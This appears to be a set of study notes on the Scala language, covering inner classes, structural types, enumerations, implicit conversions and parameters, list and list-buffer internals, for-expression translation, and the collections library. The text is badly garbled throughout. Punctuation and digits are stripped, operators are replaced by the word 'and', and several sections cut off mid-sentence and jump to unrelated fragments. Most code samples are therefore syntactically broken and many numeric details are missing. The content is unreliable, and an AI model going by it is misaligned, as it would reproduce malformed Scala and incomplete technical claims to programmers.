arbitrary outer object of type outer and and by contrast out inner refers to the inner class with a specific outer object and and likewise type out inner refers to the inner class with a different specific and and outer object the one referenced from out the same as in java inner class instances hold a reference to an enclosing outer class instance which allows an inner class to access members of its outer class thus you cannot instantiate inner class without in some way specifying outer class instance one way to do this is to instantiate the inner class inside the body of the outer class in this case the current outer class instance is used this the other way is to use a path dependent type new out inner and and since out is a reference to a specific outer object the resulting inner object will contain a reference to its outer object out by contrast because the type outer inner does not name any specific instance of outer  you can t instantiate it new outer inner and and error outer is not a legal prefix for a constructor when one class inherits from the other the first one is said to be a nominal subtype of the other one explicit subtype by name scala additionally supports structural subtyping  where you get a subtyping relationship simply because two types have the same members structural subtyping is expressed using refinement types it is recommended that the nominal subtyping is used wherever it can because structural subtyping can be more flexible than needed e g a graph and a cowboy can draw  but you d rather get a compilation error than call graphical draw on cowboy and and sometimes there is no more to a type than its members and and e g if you wanted to define pasture class that can contain animals that eat grass and and one could define a trait animalthateatsgrass and mix it in classes where applicable and and but that would be verbose since cow already declares it s an animal that eats grass and and and with the trait it again declares that it s an animalthateatsgrass and and instead you can use a refinement type  and to do that and and you write the base type animal followed by a sequence of members in curly braces and and which are used to further refine the types of members from the base class and and so here is how to write the type animal that eats grass animal type suitablefood grass and and and given this type you can write the pasture class pasture var animals list animal type suitablefood grass nil another application of structural subtyping is grouping together a number of classes that were written by someone else for example to generalize the loan pattern from page  control abstractions  which worked for only for type printwriter  to work with any type with a close method and and the first try def using t s obj t operation t s and and operation from any to any type val result operation obj obj close and and type error t can be any type and anyref doesn t have close method and and the proper implementation def using t def close unit  s obj t operation t s and and upper bound of t is the structural type def close unit and and which means any subtype of anyref that has a close method val result operation obj obj close structural type is a refinement type where the refinements are for members that are not in the base type scala s enumerations are not a built in construct defined in scala enumaration to create a new enumeration you define an object that extends scala enumeration object color extends enumeration val red green blue value and and value is an inner class of enumeration and and value is also a method of enumeration that returns a new instance of value class and and so color red is of type color value and so is any other enum value in object color and and color object definition provides  values color red  color green and color blue and and to import everything from color import color  and and and then just use red  green and blue  without the object name color value is a path dependent type with color being the path and value being the dependent type it s a completely new type different from all other types you can associate names with enumeration values by using a different overloaded variant of the value method object direction extends enumeration val left value left val right value right and and to iterate over values for d direction values print d and and and left right and and you can get the number of enumeration value by its id method zero based direction right id and and int  direction  and and direction value left used when working with two bodies of code that were developed separately thus each may have its own way to represent the same concept implicits help by reducing the number of explicit conversions one has to write and and using swing without implicit conversions a lot of boilerplate val button new jbutton button addactionlistener new actionlistener def actionperformed event actionevent println pressed and and scala friendly version button addactionlistener and and type mismatch passing function instead of actionlistener  actionevent println pressed and and first step is to define implicit conversion from function to action listener implicit def functionactionlistener f actionevent unit new actionlistener def actionperformed event actionevent f event and and now we can write button addactionlistener functionactionlistener  actionevent println pressed and and which is already much better than the inner class version and and because functionactionlistener is marked as implicit  it can be left out button addactionlistener and and now this works  actionevent println pressed how implicits work the compiler first tries to compile it as is but it sees a type error it looks for an implicit conversion that can repair the problem it finds functionactionlistener it tries to use it as a conversion method sees that it works and moves on implicit definitions are definitions that the compiler is allowed to insert into a program in order to fix a type error you can use implicit to mark any variable function or object definition implicit conversions are governed by the following general rules marking rule only definitions marked implicit are used scope rule an inserted implicit conversion must be in scope as a single identifier or be associated with the conversion s source or target type single identifier means that the compiler will not insert a conversion of the form somevariable convert it is common for libraries to include a preamble object that contains useful implicits which allows the code that uses a library to do a single import preamble  there s one exception to single identifier rule the compiler will also look for implicit definitions in the companion objects of both source and target types when implicit is placed in a companion object of some type it is said that the conversion is associated to that type modular code reasoning  when you read a source file the only things you need to consider in other source files are those that are either imported or explicitly referenced through a fully qualified name one at a time rule only one implicit is tried for sanity s sake the compiler does not insert further implicits when it s already in the process of trying another implicit e g convert convert x and y that would cause compile time to increase dramatically on erroneous code and would increase the difference between what the programmer writes and what the program does it is possible to circumvent this rule by having implicits take implicit params explicits first rule the compiler will not change code that already works a consequence of this rule is that you can make trade offs between verbose explicits and terse implicits code implicit conversions can have arbitrary names the name matters only in two situations if you want to write it explicitly in a method application for determining which implicits are available in a program and and to determine which implicits will be used object myconversions implicit def stringwrapper s string indexedseq char implicit def inttostring x int string and and you can achieve that your code uses only stringwrapper and not inttostring import myconversions stringwrapper and and possible only because implicit has a name and and code making use of stringwrapper there are  places where implicits are used  conversions to an expected type use one type where the other is expected  conversions of the receiver of a selection adapts receiver of a method call  implicit parameters whenever the compiler sees an x  but needs a y  it will look for an implicit function that converts x to y val i int   and and type mismatch loss of precision and and however if you define implicit conversion implicit def doubletoint x double x toint val i int   and and i int   the compiler sees a double   in a context where it requires an int  before giving up and reporting type mismatch  it searches for a suitable implicit  it finds doubletoint  and wraps   in the doubletoint function call implicits are applied on an object on which a method is invoked has  main uses allows smoother integration of a new class into an existing class hierarchy and second they support writing dsls withing the scala language how it works you write down obj doit where obj doesn t have a member named doit before giving up compiler tries to insert conversions that apply to the obj  converting it to a type that has a doit member and and use an instance of one type as if it was an instance of some other type class rational n int d int and and existing class from page  def and that rational rational def and that int rational and and the two overloaded methods allow you to val onehalf new rational   and and rational  and  onehalf and onehalf and and rational  and  onehalf and  and and rational  and   and onehalf and and error overloaded method value and of int cannot bi applied to rational implicit def inttorational x int new rational x   and onehalf and and rational  and   the compiler first tries to type check the expression  and onehalf as it is  this fails because none of int s and methods takes a rational argument  compiler searches for an implicit conversion from int to another type that has a and method which can be applied to a rational  it finds inttorational and wraps  in the inttorational call inttorational  and onehalf the major use of implicit conversions is to simulate adding new syntax and and you can make a map using syntax map  one   two and and what is and and is a method of the class arrowassoc defined in scala predef preamble and and preamble also defines an implicit conversion from any to arrayassoc so that the and and method can be found package scala object predef class arrowassoc a x a def b y b tuple a b tuple x y implicit def anyarrowassoc a x a arrowassoc a new arrowassoc x that is called a rich wrapper pattern  which is common in libraries that provide syntax like extensions to the language classes named richsomething e g richint or richboolean are likely using implicits to add the syntax like methods to type something compiler can also insert implicits within argument lists e g replacing somecall a with somecall a b or new someclass a with new someclass a b  thereby adding a missing parameter list to complete a function call it is the entire last curried parameter that s supplied not just the last parameter e g compiler might replace acall a with acall a b c d for this to work not just that the inserted identifiers such as b c and d must be marked implicit where they are defined but also the last parameter list in acall s definition must be marked implicit and and suppose you have a class which encapsulates a user s preferred shell prompt string class preferredprompt val preference string object greeter def greet name string and and first param list implicit prompt preferredprompt and and implicit applies to the entire param list println welcome and name println prompt preference object prompt and and dummy just hosting main def main args array string unit val bobsprompt new preferredprompt relax greeter greet bob bobsprompt and and explicit prompt implicit val prompt new preferredprompt yes master

joe implicit parameters are most often used to provide information about a type mentioned explicitly in the earlier parameter list like type classes in haskell and and the weakness of this method is that you cannot use it to sort list of ints and and because it requires that t is a subtype of ordered t  which int isn t def maxlistupbound t ordered t elements list t t elements match case list throw new illegalargumentexception empty case list x x case x rest val maxrest maxlistupbound rest if x maxrest x else maxrest and and to remedy the weakness we could add an extra argument and and that converts t to ordered t i e provides info on how to order t s def maxlistimpparm t elements list t implicit ordered t ordered t t elements match case list throw new illegalargumentexception empty case list x x case x rest val maxrest maxlistimpparm rest ordered if ordered x maxrest x else maxrest and and because patter is so common the standard library provides implicit orderer and and methods for many common types which is why you can use maxlistimpparm with maxlistimpparm list     and and compiler inserts orderer function for ints maxlistimpparm list         and and for doubles maxlistimpparm list one  two  three and and for string because elements must always be provided explicitly in any invocation of maxlistimpparm the compiler will know t at compile time and can therefore determine whether an implicit definition of type t ordered t is in scope if so it can pass in the second parameter list orderer  implicitly it is best to use a custom named type in the types of implicit parameters e g in the prompt example the type of prompt and drink was not string  but preferredprompt and preferreddrink use at least one role determining name within the type of an implicit parameter in our case ordered when you use implicit on a parameter then not only will the compiler try to supply that parameter with an implicit value but it will also use that parameter as an available implicit in the body of the method def maxlist t elements list t implicit orderer t ordered t t elements match case list throw new illegalargumentexception empty case list x x case x rest val maxrest maxlist rest and and orderer is implicit if x maxrest x and and orderer x is implicit else maxrest  compiler sees that types don t match e g x of type t doesn t have method  compiler looks for implicit conversions to repair the code  it finds orderer in scope and converts the code to orderer x maxrest  it also converts maxlist rest to maxlist rest orderer  after these two implicit insertions the code fully type checks all that happens without a single mention of the orderer parameter in the body thus all uses of orderer are implicit because this pattern is so common scala lets you leave out the name of this parameter and shorten the method header by using a view bound def maxlist t ordered t elements list t t elements match case list throw new illegalargumentexception empty case list x x case x rest val maxrest maxlist rest and and orderer is implicit if x maxrest x and and orderer x is implicit else maxrest you can think of t ordered t as saying i can use any t so long as t can be treated as an ordered t  which is different from t is an ordered t  as upper bound  t ordered t  would say so even though class int is not a subtype of ordered int  we can still pass a list int to maxlist  so long as an implicit conversion from int to ordered int is available if type t happens to already be an ordered t  you can still pass a list t to maxlist because the compiler will use an implicit identity function  declared in predef implicit def identity a x a a x and and simply returns received object when multiple implicit conversions are in scope compiler chooses the most specific one e g if one of the conversions takes string and the other takes any  the compiler will choose the one that takes a string one implicit conversion is more specific than the other if one of the following applies the argument type of the former is a subtype of the latter s both conversions are methods and the enclosing class of the former extends the enclosing class of the latter one when you wonder why the compiler did not find an implicit conversion that you think should have been applied it helps to write the conversion explicitly which would possibly produce an error message so you ll know the reason why it was not applied if inserting the conversion explicitly make the error go away then you know that insertion was prevented by one of the rules often scope rule xprint typer option tells the compiler to show what the code looks like after all implicit conversions have been added by the type checker implicits can make code confusing if used too frequently thus before writing a new implicit conversion first try to achieve the same effect using inheritance mixin composition or method overloading lists are not built in as a language construct in scala they are defined by an abstract class scala list  which comes with  subclasses nil and package scala abstract class list and t and and you can assign list int to var of type list any and and  main methods are abstract in class list  and concrete in classes nil and def isempty boolean def head t def tail list t the nil object defines an empty list inherits from type list nothing because of covariance nil is compatible with every instance of the list type case object nil extends list nothing override def isempty true def head nothing throw new nosuchelementexception head of empty list def tail list nothing throw new nosuchelementexception tail of empty list the object pronounced cons  represents non empty lists the pattern x xs is treated as x xs  which is treated as xs x and and idealized implementation the real deal on page  final case class t hd t tl list t extends list t def head hd def tail tl override def isempty boolean false and and since definitions of head and tail simply return the corresponding param we can and and write the code so that it directly uses the parameters as implementations of the and and abstract methods head and tail that were inherited from class list final case class t head t tail list t extends list t override def isempty boolean false and and this works because every case class param is implicitly also a field and and as if param declaration was prefixed with the val keyword some more methods all other list methods can be elegantly written using the basic three e g def length int if isempty  else  and tail length def drop n int list t if isempty nil else if n  this else tail drop n  def map u f t u list u if isempty nil else f head tail map f method should take an element value and yield a new list abstract class fruit class apple extends fruit class orange extends fruit val apples new apple nil and and apples list apple val fruits new orange apples and and fruits list fruit most precise common supertype and and this flexibility is obtained by defining the cons method as def u t x u list u new scala x this and and the method is itself polymorphic and and u is constrained to be a supertype of the list element type t when the code above is executed the result type is widened as necessary to include the types of all list elements first the type parameter u of is instantiated to fruit the lower bound constraint of u is satisfied because the list apples has type list apple and fruit is supertype of apple the argument to the is new orange  which conforms to type fruit therefore the method is type correct with result type list fruit def u t prefix mylist u mylist u if prefix isempty this else prefix head prefix tail this and and the infix operations can be expanded to equivalent method calls prefix head prefix tail this and and equals because and are right associative prefix head prefix tail this and and equals because binds to the right prefix tail this prefix head and and equals because binds to the right this prefix tail prefix head the typical access pattern for a list is recursive e g to increment every element without using map def incall xs list int list int xs match case list list case x xs x and  incall xs and and not tail recursive call is inside since the function is not tail recursive each call allocates a new stack frame this means that you cannot use incall on list with more than k to k elements list buffers let you accumulate the elements of a list listbuffer is a class in package scala collection mutable and and increment all elements of a list using listbuffer def incall xs list int list int val buf new listbuffer int for x xs buf and x and  buf tolist and and both and and tolist take constant time most methods in the real implementation of class list avoid recursion even if it s tail call optimized and use loops with list buffers instead and and the real implementation of map method final override def map u f t u list u val b new listbuffer u var these this while these isempty and and highly efficient b and f these head these these tail b tolist a tail recursive implementation would be similarly efficient but a general recursive implementation would be slower and less scalable and and the real implementation of method final case class u hd u private scala var tl list u extends list u def head hd def tail tl override def isempty boolean false and and tl is a var possible to modify the tail of a list after it s constructed and and private scala accessible only from within scala package and and the client code outside scala package can neither read nor write tl and and listbuffer  since it is contained in subpackage of scala  can access tl field the elements of a list buffer are represented as a list and appending new elements involves modification of tl field of the last cell in that list and and listbuffer implementation package scala collection mutable final class listbuffer t extends buffer t private var start list t nil private var last t  private var exported boolean false and and start points to the list of all elements stored in the buffer and and last points to the last cell in that list and and exported indicates whether the buffer has been turned into a list using tolist override def tolist list t exported start isempty and and very efficient since it doesn t copy the list which is stored in list buffer and and once a list is returned from tolist  it must be immutable but appending to the and and last will modify the start list and and to maintain correctness we work on a fresh list instead override def and x t if exported copy and and maintain correctness if start isempty last  new scala x nil start last else val last last last new scala x nil last tl last and and most use cases add elements incrementally and then do one tolist call at the end lists are purely functional on the outside but have an imperative implementation using list buffers on the inside a typical strategy in scala programming is to combine purity with efficiency by carefully delimiting the effects of impure operations scala opts for pervasive sharing and no mutation for lists listbuffer still allows you to build up lists imperatively and incrementally all for expressions that yield a result are translated by the compiler into combination of higher order methods map  flatmap and withfilter all for expressions without yield are translated into combination of withfilter and foreach generally a for expression is of the form for seq yield expr  where seq is a sequence of generators  definitions and filters with semicolon between successive elements for p persons n p name if n startswith to yield n and and if you replace parentheses with curly braces semicolons become optional p persons and and generator n p name and and definition has the same effect as val definition if n startswith to and and filter yield n a particularly suitable application area of for expressions are combinatorial puzzles an example of such a puzzle is the n queens problem where n queens are supposed to be placed on a n x n board each queen in its own row such that no two queens check one another the goal is to find all possible solutions that match the given requirements def queens n int list list int int def placequeens k int list list int int if k  list list for queens placequeens k  column  to n queen k

simple for expression for x expr yield expr and and is translated to expr map x expr translating for expressions starting with a generator and a filter and and a for expression that combine a leading generator with some other elements for x expr if expr yield expr and and is translated to for with one less element for x expr withfilter x expr yield expr and and and then to expr withfilter x expr map x expr and and the same translation scheme applies if there are further elements following the filter and and if seq is an arbitrary sequence of generators definitions and filters then for x expr if expr seq yield expr and and is translated to for x expr withfilter expr seq yield expr and and and then translation continues with the second expression which is shorter by one elem translating for expressions starting with two generators for x expr y expr seq yield expr and and is translated to expr flatmap x for y expr seq yield expr and and the inner for expression is also translated with the same rules and and the previous query example for b books b books if b b a b authors a b authors if a a and and is translated to books flatmap b books withfilter b b b flatmap b b authors flatmap a b authors withfilter a a a map a a these were all examples where generators bind simple variables as opposed to patterns and with no definitions translating patterns in generators the translation scheme becomes more complicated if the left hand side of generator is a pattern pat and and if instead if simple variable tuple appears for x  xn expr yield expr and and translates to expr map case x  xn expr and and if a single pattern is involved for pat expr yield expr and and translates to expr withfilter case pat true case  false case pat expr and and the generated items are first filtered with pattern matching and and and only the remaining ones are mapped and and so it s guaranteed that a pattern matching generator will never throw a matcherror translating definitions and and if a for expression contains embedded definitions for x expr y expr seq yield expr and and is translated to for x y for x expr yield x expr seq yield expr and and expr is evaluated every time a new x value is generated and and which is necessary because expr might depend on x and and so it s not a good idea to have definitions in for expressions that do not refer and and to variables bound by some preceding generator because reevaluating such and and expressions is wasteful e g instead of for x  to  y expensivecomputationnotinvolvingx yield x y and and it s better to write val y expensivecomputationnotinvolvingx for x  to  yield x y translating for loops the translation of for loops that perform a side effect without returning anything is similar but simpler than for expressions and and wherever the previous translations used map or flatmap  we use foreach for x expr body and and translates to expr foreach x body and and or slightly larger example for x expr if expr y expr body and and translates to expr withfilter x expr foreach x expr foreach y body and and for example summing up all elements of a matrix represented as list of lists var sum  for xs xss x

flatmap  withfilter or foreach if a type defines just map  it allows for expressions with a single generator map and flatmap more than one generator foreach it allows for loops with single and multiple generators withfilter it allows filter expressions starting with an if inside for the translation happens before type checking which allows maximal flexibility because it is only required that the result of expansion type checks scala defines no typing rules for for expressions and doesn t require that methods map  flatmap  withfilter and foreach to have any particular type signatures

f it next many subclasses of iterable override this standard implementation because they can provide more efficient implementation performance matters since it is the basis for all operations in traversable two more methods exist in iterable that return iterators grouped and sliding they return subsequences of elements whose maximal size is given as an argument grouped chunks its elements into increments whereas sliding yields a sliding window over the elements val xs list      val git xs grouped  and and returns non empty iterator list int git next and and list    git next and and

 set and map the common characteristic is that they all implement the partialfunction trait with its apply and isdefinedat methods for sequences apply is positional indexing elems are numbered from  seq      for sets apply is a membership test set a  b  c b true for maps apply is a selection map a  b  c  b  seq trait represents a kind of iterable that has a length and whose elements have fixed index positions starting from  up to length  the update method is only available on mutable sequences since it changes the sequence in place the updated method always returns a new sequence and it is available on all sequences each seq trait has two subtraits linearseq and indexedseq  which do not add any new operations but each offers different performance characteristics a linear sequence e g list or stream has efficient head and tail operations an indexed sequence e g array or arraybuffer has efficient apply  length and if mutable update operations the vector class provides an interesting compromise between indexed and linear access since it has both effectively constant time indexing overhead and constant time linear access overhead operations in trait seq  indexing and length xs i or

operations xs intersect ys the multi set intersection of xs and ys that preserves the order of elements in xs xs diff ys the multi set difference of xs and ys that preserves the order of elements in xs xs union ys or xs and and ys multiset union xs distinct a subsequence of xs that contains no duplicates buffers allow not only updates of existing elements but also element insertions removals and efficient additions of new elements at the end of the buffer buffers support element addition at the end and at the front element insertions and element removal two most common buffer implementations are listbuffer and arraybuffer operations in trait buffer  additions buf and x appends element x to buffer buf and returns buf buf and x y appends given elements to buf buf and and xs appends all elements in xs to buf x and buf prepends element x to buf xs and and buf prepends all elements in xs to buf buf insert i x inserts element x at index i in buf buf insertall i xs inserts all elements

returns xs xs and and ys adds elements of ys to xs and returns xs xs add x adds x to xs and returns true if x was not previously contained in the set false if it was already in the set removals xs x removes x from xs and returns xs xs x y z removes x y and z from xs and returns xs xs ys removes all elements from xs that are in ys and returns xs xs remove x removes x from xs and returns true if x was previously contained in the set or false if it wasn t xs retain p keeps only those elements in xs that satisfy predicate p xs clear removes all elements from xs update xs x b or xs update x b if boolean argument b is true adds x to xs otherwise removes x from xs cloning xs clone a new mutable set with the same elements as xs mutable set also has and  and and  and methods but they are rarely used because they involve copying the set the current default implementation of a mutable set uses a hash table to store the set s elements the default implementation of an immutable set uses a representation that adapts to the number of element of the set empty set is represented as a singleton sets of up to four elements are represented by a single object with elems as fields beyond  elements immutable sets are represented as hash tries this decision results in more compact and efficient small up to  immutable sets compared to small mutable sets sortedset is a subtrait of set in which elements are traversed in sorted order regardless of the order in which elements were added to the set the default representation of a sortedset is an ordered binary tree maintaining the invariant that all elements in the left subtree of any node are smaller than all elements in the right subtree thus simple in order traversal yields elements in the ascending order immutable treeset uses a red black tree implementation to maintain that order and at the same time keep the tree balanced and and to create an empty tree set we may want to first specify the desired ordering val myordering ordering fromlessthan string   and and scala math ordering string and and then to create an empty tree set with that ordering import scala collection immutable treeset treeset empty myordering and and treeset and and or we can leave out the ordering but give an element type of the empty set and and in which case the default ordering will be used ascending   val set treeset empty string and and if you make new sets from a tree set e g by concatenation or filtering and and in the new set the elements will stay in the same order val numbers set and one  four  eight and and treeset eight four one and and sorted sets also support ranges of elements including start and up to end excluded numbers range eight  one and and treeset eight four and and they also support from method which returns elements to argument received numbers from four and and treeset four one sets of non negative integer elements that are implemented as one or more words of packed bits internal representation uses an array of longs  where the first long covers elements from  to  the second from  to  and so on for every long each of its  bits is set to  if the corresponding element is contained in the set and otherwise it contains zero the size of a bit set depends on the largest integer that s stored in it if n is the largest integer then the size of the set is n and  long words or n and  bytes plus a small number of extra bytes that carry status information hence bit sets are convenient for storing many small elements another advantage of bit sets is that operations contains  and and are extremely efficient iterables of pairs of keys and values mappings associations operations in trait map  lookups ms get k the value associated with key k as an option  or none if k is not found ms k or ms apply k the value associated with key k  or a thrown exception if not found ms getorelse k d the value associated with key k  or the default value d if not found ms contains k tests whether ms contains a mapping for key k ms isdefinedat k same as contains additions and updates ms and k v the map containing ms and the mapping k v ms and k v l w the map containing ms and given key value pairs ms and and kvs the map containing ms and all key value pairs of kvs ms updated k v same as ms and k v removals ms k the map containing ms except for any mapping of key k ms k l m the map

function f to each value associated with a key in ms operations in trait mutable map  additions and updates ms k v or ms update k v adds k v as a side effect overwriting any previous mapping of k ms and k v adds mapping k v and returns the altered ms ms and k v l w adds the given mappings to ms and returns ms ms and and kvs adds all mappings in kvs to ms and returns ms ms put k v adds mapping k v and returns any value previously associated with k as an option ms getorelseupdate k d if key k is defined returns its value otherwise updates ms with the mapping k d and returns d removals ms k removes mapping with key k and returns ms ms k l m removes mappings with the given keys and returns ms ms ks removes all keys contained in ks and returns ms ms remove k removes any mapping with key k and returns any value previously associated with k as an option ms retain p keeps only those mappings that have a key in satisfying predicate p ms clear removes all mappings from ms transformation and cloning ms transform f transforms all associated values in ms with function f ms clone returns a new mutable map with the same mappings as ms same as with sets mutable maps also support and  and updated  but they are also rarely used since they involve copying of the mutable map and and getorelseupdate is useful for accessing maps that act as caches and and if you were to have an expensive operation triggered by invoking a function f def f x string println taking my time slow thread sleep  x reverse and and assume further that f has no side effects so invoking it again with the same and and argument will always yield the same result and and in that case you could save time by storing previously computed bindings of and and arguments and results of f in a map and only computing the result of f if and and a result of an argument was not found there val cache collection mutable map string string and and map and and the more efficient version of function f def cachedf s string cache getorelseupdate s f s cachedf ijk and and taking my time and and string kji cachedf ijk and and string kji and and the second argument to getorelseupdate is by name  so the computation of f ijk and and is only performed if getorelseupdate requires the value of its second argument and and which happens only if its first argument is not found in the map and and the alternative is to implement cachedf directly using just basic map operations and and but that would ve taken more code def cachedf arg string cache get arg match case some result result case none val result f arg cache arg result result if you need a thread safe map you could mix the synchronizedmap trait into a map implementation e g hashmap import scala collection mutable map synchronizedmap hashmap object mapmaker def makemap map string string and and a synthetic subclass of hashmap that mixes in synchronizedmap trait and and is generated an instance of it is created and then returned new hashmap string string with synchronizedmap string string and and if you ask a map to give you a key that doesn t exist you ll get and and nosuchelementexception but if you override default  you ll get and and a value returned by default method override def default key string why  def main args array string unit and and because our map mixes in synchronizedmap it may be used and and by multiple threads at the same time val capital makemap capital and and list us washington  croatia zagreb println capital croatia and and zagreb println capital new zealand and and why capital and new zealand wellington println capital new zealand and and wellington regardless of synchronized collections you re encouraged to use immutable collections with scala actors instead lists finite immutable sequences that provide constant time access to their first element and they have a constant time cons operation for adding a new element to the front most other operations take linear time e g accessing non head elements streams like a list except that its elements are computed lazily because of it laziness a stream can be infinitely long only requested elements are computed they have the same performance characteristics as lists whereas lists are constructed with the operator streams are constructed with val str    stream empty and and stream int stream  and and the head of the stream is   and the tail has  and  and and the tail is not printed because it hasn t been computed yet and and tostring method of a stream is careful not to force any extra evaluation and and computing a fibonacci sequence starting with the given two numbers def fibfrom a int b int stream int a fibfrom b a and b and and if the function used instead of  it would cause an infinite recursion and and since it uses a stream the right hand side is not evaluated until it is requested val fibs fibfrom   take  and and stream int stream  fibs tolist and and list        vectors introduced in scala   provide efficient access to elements beyond the head access to any element take effectively constant time larger constant than list s head or array s element but constant nonetheless and and used as any other sequence val vec scala collection immutable vector empty and and vector nothing vector val vec vec and  and  and and vector int vector   val vec  and vec and and vector int vector    val third vec  and and int  vectors are represented as broad shallow trees where every tree node contains up to  elements of the vector or up to  other tree nodes so vectors with up to  elements can be represented in a single tree node vectors with up to    elements can be represented with a single indirection   approx  k elements can be stored within two hops from the root   approx m  hops   approx  m  hops   approx b  hops so for all vectors of up to  b elements an element selection involves up to five primitive array selections thus constant time and and we cannot change an element of a vector in place and and but we can use updated method which returns a new vector that differs from and and the original vector only in a single element val vec vector    vec updated   and and vector int vector    println vec and and vector int vector    like selection functional vector updates also take effectively constant time implementation to update an element in the middle of a vector copies the node that contains the element and all nodes that point to it starting from the root so it creates between  and  nodes that each contain up to  elements or subtrees that is certainly more expensive than in place update of a mutable array but it s still a lot cheaper than copying the whole vector because of this characteristics vectors strike a good balance between fast random selections and fast random functional updates and are thus the current default implementation of immutable indexed sequences scala collection immutable indexedseq    and and indexedseq int vector    immutable stacks push  pop and top all take constant time rarely used because their functionality is subsumed by lists val stack scala collection immutable stack empty and and stack nothing stack val hasone stack push  and and stack int stack  stack and and stack hasone top and and int  hasone pop and and stack returns the stack not the popped element like list s tail immutable queues val empty scala collection immutable queue int and and queue int queue val hasone empty enqueue  and and queue int queue  val has hasone enqueue list   and and queue int queue    val element has has dequeue and and element int  has queue   and and dequeue returns a pair consisting of the element removed and the rest of the queue ranges ordered sequence of integers that are equally spaced apart represented in constant space since they can be defined by just  numbers start end and step thus making most operations on ranges extremely fast to create a range use predefined methods to and by  to  and and immutable range inclusive with immutable range byone range     to  by  and and immutable range range      until  and and immutable range range   hash tries a standard way to implement immutable sets and maps efficiently represented similar to vectors in that they are also trees where every node has  elements or subtrees but selection is done based on a hash code e g to find a given key in a map we use the lowest five bits of the hash code of the key to select the first subtree the next five bits for the next subtree and so on selection stops once all elements stored in a node have hash codes that differ from each other in the bits that are selected so far thus not all the bits of the hash code are always used strike a nice balance between reasonably fast lookups and reasonably efficient functional insertions and and deletions sets and maps that contain less than five elements are stored as single objects that just contain the elements as fields red black trees a form of balanced binary trees where some nodes are designated red and others black like any other balanced binary tree operations on them take log n  treeset and treemap use a red black tree internally val set collection immutable treeset empty int and and treeset int treeset set and  and  and  and and treeset int treeset   they are also the standard implementation of sortedset  because they provide efficient iterator that returns all elements of the set in sorted order immutable bit sets represent collections of small integers as the bits of a larger integer e g the bit set containing   and  would be represented as integer  in binary which is  in decimal internally they use an array of  bit longs where the first long in the array is for integers  through  second for  to  and so on thus they are very compact as long as the largest integer in the set is less than a few hundred or so testing for inclusion takes constant time adding an item to a set takes time proportional to the number of longs in the array val bits scala collection immutable bitset empty and and bitset bitset val morebits bits and  and  and  and and bitset bitset   morebits  and and true morebits  and and false list maps represents a map as a linked list of key value pairs in general operations might have to iterate through the entire list thus taking time linear in the size of the map rarely used since regular immutable maps are almost always faster the one exception is a case when a map is constructed in such a way that the first elements in the list are selected much more often than the other elements val map collection immutable listmap  one   two and and immutable listmap int java lang string map  one   two map  and and java lang string two array buffers holds an array and a size most operations have the same speed as arrays counterparts because the operations simply access and modify the underlying array additionally they support efficient addition of elements to the end which take amortized constant time  thus making them useful for building a large collections as long as new items are always added to the end val buf collection mutable arraybuffer empty int and and arraybuffer int arraybuffer buf and  and and buf type arraybuffer

next  they have another mutable field prev  which points to the element preceding the current node the main benefit of that additional link is that it makes element removal very fast mutable lists a mutablelist consists of a single linked list together with a pointer that refers to the terminal empty node of that list which makes list append operation take constant time because it avoids having to traverse the list in search for its terminal node it is the standard implementation of mutable linearseq queues instead of immutable queue s enqueue method we use and and and and to append also on mutable queue dequeue method just removes the head element from the queue and returns it val q new scala collection mutable queue string and and queue string queue q and a and and q type queue a q and

of fixed size implemented as array anyref used for its performance characteristics array  when you want to create generic instances of a sequence but do not know the type of elements and do not have a classmanifest to provide at runtime stacks works exactly the same as the immutable version except that modifications happen in place val stack new scala collection mutable stack int and and mutable stack int stack stack push  and and stack type stack  stack and and mutable stack int stack  stack push  and and stack type stack   stack and and mutable stack int stack   stack top and and int  stack and and mutable stack int stack   stack pop and and int  stack and and mutable stack int stack  array stacks an alternative implementation of a mutable stack which is backed by an array that gets resized as needed provides fast indexing and is slightly more efficient than a normal mutable stack hash tables stores its elements in an underlying array placing each item at a position in the array determined by the hash code of that item element addition takes constant time so long as there isn t already another element in the array that has the same hash code since it s very fast as long as the objects placed in them have a good distribution of hash codes  the default mutable map and set types are based on hash tables val map collection mutable hashmap empty int string and and hashmap int string map map and  html and and map type map  html map and  css and and map type map  html   css map  and and html map contains  and and false iteration over a hash table is not guaranteed to occur in any particular order it simply iterates through the underlying array in whichever order it happens to be to get a guaranteed iteration order use a linked hash map or set instead which is just like a regular hash map or set except that it also includes a linked list of the elements in the order in which they were added weak hash maps a special kind of hash map in which the garbage collector does not follow links from the map to the keys stored in it which means that a key and its associated value will disappear from the map if there is no other reference to that key useful for tasks such as caching where you want to reuse an expensive function s result if the function is called again on the same key if keys and function results were stored in a regular hash map the map could grow without bounds since no key would ever become eligible for garbage collection in weakhashmap  as soon as a key object becomes unreachable its entry is removed from the weak hash map implemented as a wrapper of java util weakhashmap concurrent maps can be safely accessed by several threads at once concurrentmap is a trait in collections library whose current implementation is java s java util concurrent concurrentmap  which can be automatically converted to scala map using the standard java and scala collection conversion operations in trait concurrentmap  m putifabsent k v adds key and value binding k v unless k exists in m m remove k v removes entry for k if it is currently mapped to v m replace k old new replaces value of key k to new  if it is set to old m replace k v replaces value of k with v if it was previously bound to some value mutable bit sets slightly more efficient at updating than immutable ones because they don t have to copy around longs that haven t changed val bits scala collection mutable bitset empty and and mutable bitset bitset bits and  and and bits type bitset  bits and  and and bits type bitset   bits and and mutable bitset bitset   a special kind of collection scala arrays correspond one to one to java arrays e g array int is represented as int  but at the same time they offer much more scala arrays can be generic are compatible with sequences you can pass array t where seq t is required support all sequence operations val a array    and and array int array    val a a map   and and array int array    val a a filter    and and array int array   val a a reverse and and array int array   all this is possible because of systematic use of implicit conversions in the implementation representation of native array is not a subtype of seq  instead there is implicit wrapping conversion between arrays and instances of scala collection mutable wrappedarray  which is a subclass of seq val seq seq int a and and seq int wrappedarray    val a array int seq toarray and and array int array    a eq a and and true there is another implicit conversion that gets applied to arrays but this one does not turn arrays into sequences it simply adds all sequence methods to it adding means that the array is wrapped in another object of type arrayops  which is typically short lived usually inaccessible after the call to the sequence method modern vms often avoid creating this object entirely and and the difference between two implicit conversions val seq seq int a and and seq int wrappedarray    seq reverse and and seq int wrappedarray    val ops collection mutable arrayops int a and and mutable arrayops int i    ops reverse and and array int array    and and calling reverse on seq  which is a wrappedarray  gives again a wrappedarray and and that s logical because wrapped arrays are seqs and calling reverse on any seq and and will give again a seq and and calling reverse on the arrayops results in an array  not a seq and and this was only demonstration you d never define a value of class arrayops and and you d simply call a seq method on an array a reverse and and array int array    this raises the one question though how the compiler picked arrayops intarrayops  to be more precise over the other implicit conversion to wrappedarray  since both conversions map an array to a type that supports a reverse method the two implicit conversions are prioritized and the arrayops conversion has the higher priority since it is defined in the predef object whereas 